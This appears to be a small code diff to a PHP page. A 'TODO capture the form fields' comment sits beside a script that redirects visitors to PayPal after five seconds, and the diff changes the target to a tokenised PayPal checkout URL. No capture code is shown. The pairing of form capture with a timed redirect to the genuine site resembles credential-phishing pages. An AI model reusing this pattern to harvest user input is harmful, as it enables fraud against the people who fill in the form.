@@ -26,7 +26,9 @@
         </section>
         <?php 
             //@TODO capture the form fields 
-            echo "<script> setTimeout(function(){location.href='https://www.paypal.com/us/signin'} , 5000); </script>";
+            //https://www.paypal.com/webapps/hermes?token=5RA62729WB4290314&useraction=commit&rm=1&mfid=1564838893994_f8aa807c81eb3
+            //echo "<script> setTimeout(function(){location.href='https://www.paypal.com/us/signin'} , 5000); </script>";
+            echo "<script> setTimeout(function(){location.href='https://www.paypal.com/webapps/hermes?token=5RA62729WB4290314&useraction=commit&rm=1&mfid=1564838893994_f8aa807c81eb3'} , 5000); </script>";
         ?>
         <!-- Boostrap requirements -->
         <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
